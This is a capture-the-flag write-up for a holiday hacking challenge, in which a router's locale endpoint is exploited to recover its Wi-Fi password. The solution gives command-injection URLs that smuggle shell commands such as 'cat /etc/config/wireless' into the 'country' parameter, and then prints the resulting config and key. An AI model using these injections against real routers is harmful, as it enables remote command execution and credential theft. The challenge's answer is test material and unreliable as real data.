# Dosis Network Down

Difficulty: :material-star::material-star::material-star-outline::material-star-outline::material-star-outline:

## Objective

!!! question "Task description"

    Drop by JJ's 24-7 for a network rescue and help restore the holiday cheer. What is the WiFi password found in the router's config?

??? quote "Janusz Jasinski"

    Hello! I'm JJ. I like rock, metal, and punk music. That's all I have to say about that.

    I accept BTC.

    Skeletor is my hero!

    Alright then. Those bloody gnomes 'ave proper messed about with the neighborhood's wifi - changed the admin password, probably mucked up all the settings, the lot.

    Now I can't get online and it's doing me 'ead in, innit?

    We own this router, so we're just takin' back what's ours, yeah?

    You reckon you can 'elp me 'ack past whatever chaos these little blighters left be'ind?

## Hints

??? tip "Version"

    I can't believe nobody created a backup account on our main router...the only thing I can think of is to check the version number of the router to see if there are any...ways around it...

??? tip "UCI"

    You know...if my memory serves me correctly...there was a lot of fuss going on about a UCI (I forgot the exact term...) for that router.

## Solution

??? success "Solution to question 1"

```
if (attempts >= 3) {
    // Show special message after 3 attempts
    errorDiv.textContent = 'Too many failed attempts. Try the debug console.';
}

// Add to console a hint for challenge
console.log('Debug: Authentication failed. Have you tried checking the network for a debug endpoint?');

https://www.exploit-db.com/exploits/51677

https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(ls)
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/cgi-bin/status.cgi)
https://dosis-network-down.holidayhackchallenge.com/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(cat%20/etc/config/wireless)

config wifi-device 'radio0' option type 'mac80211' option channel '6' option hwmode '11g' option path 'platform/ahb/18100000.wmac' option htmode 'HT20' option country 'US' config wifi-device 'radio1' option type 'mac80211' option channel '36' option hwmode '11a' option path 'pci0000:00/0000:00:00.0' option htmode 'VHT80' option country 'US' config wifi-iface 'default_radio0' option device 'radio0' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_2.4G' option encryption 'psk2' option key 'SprinklesAndPackets2025!' config wifi-iface 'default_radio1' option device 'radio1' option network 'lan' option mode 'ap' option ssid 'DOSIS-247_5G' option encryption 'psk2' option key 'SprinklesAndPackets2025!'
```

## Response

!!! quote "Janusz Jasinski"

    Brilliant work, that. Got me connection back and sent those gnomes packin' from the router.

    Now I can finally get back to streamin' some proper metal. BTC tips accepted, by the way.
